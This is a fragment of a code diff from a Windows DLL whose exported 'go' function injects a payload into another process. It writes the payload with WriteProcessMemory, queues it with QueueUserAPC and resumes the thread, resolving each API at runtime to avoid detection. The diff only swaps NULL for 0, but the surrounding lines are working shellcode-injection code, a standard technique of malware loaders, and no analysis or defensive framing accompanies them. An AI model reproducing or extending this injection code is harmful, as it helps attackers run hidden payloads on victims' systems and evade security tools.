@@ -299,7 +299,7 @@ extern "C" __declspec(dllexport) int go()
 	pWriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
 	
 	QueueUserAPC_t pQueueUserAPC = (QueueUserAPC_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sQueueUserAPC);
-	pQueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);
+	pQueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, 0);
 	
 	ResumeThread_t pResumeThread = (ResumeThread_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sResumeThread);	
 	pResumeThread(pi.hThread);
